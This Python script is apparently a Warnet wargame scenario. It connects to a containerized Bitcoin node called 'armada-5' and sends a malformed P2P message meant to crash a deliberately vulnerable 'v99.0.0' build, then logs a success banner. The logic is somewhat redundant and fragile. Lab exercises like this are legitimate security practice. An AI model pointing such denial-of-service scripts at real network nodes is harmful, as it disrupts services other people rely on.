#!/usr/bin/env python3

import socket
import time

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import msg_ping
from test_framework.p2p import P2PInterface

class msg_unknown:
    """Unknown P2P message that should crash vulnerable nodes"""
    __slots__ = ()
    msgtype = b"unknown"  # Unknown message type

    def __init__(self):
        pass

    def serialize(self):
        # Return some random bytes that look like a malformed message
        return b"klingon_message_data_that_crashes_nodes"

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class UnknownMessageAttack(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = "Send unknown P2P message to crash v99.0.0 nodes"
        parser.usage = "warnet run --debug"

    def get_node(self) : 
        for n in self.nodes:
            try:
                n.getnetworkinfo()
                node = n
                break
            except Exception as e:
                continue

        return node

    # Scenario entrypoint
    def run_test(self):
        node = self.get_node()

        if node is None:
            self.log.error("No working nodes found!")
            return
        for n in self.nodes:
            try:
                n.getnetworkinfo()
                node = n
                self.log.info(f"Using working node {n.index}")
                break
            except Exception as e:
                self.log.info(f"Node {n.index} not accessible: {e}")
                continue

        if node is None:
            self.log.error("No working nodes found!")
            return

        victim = "armada-5"

        try:
            dstaddr = socket.gethostbyname(victim)
        except socket.gaierror as e:
            return

        attacker = P2PInterface()
        try:
            attacker.peer_connect(
                dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
            )()
            attacker.wait_until(lambda: attacker.is_connected, check_connected=False, timeout=30)
        except Exception as e:
            return


        # Create and send the unknown message
        unknown_msg = msg_unknown()
        attacker.send_message(unknown_msg)

        try:
            ping = msg_ping()
            ping_count = 0
            while ping_count < 5:
                time.sleep(1)
                self.log.info(f"Ping attempt {ping_count + 1}/5")
                attacker.send_message(ping)
                ping_count += 1


        except Exception as e:
            self.log.info("CRITICAL VULNERABILITY EXPLOITED SUCCESSFULLY!")


def main():
    UnknownMessageAttack().main()


if __name__ == "__main__":
    main()
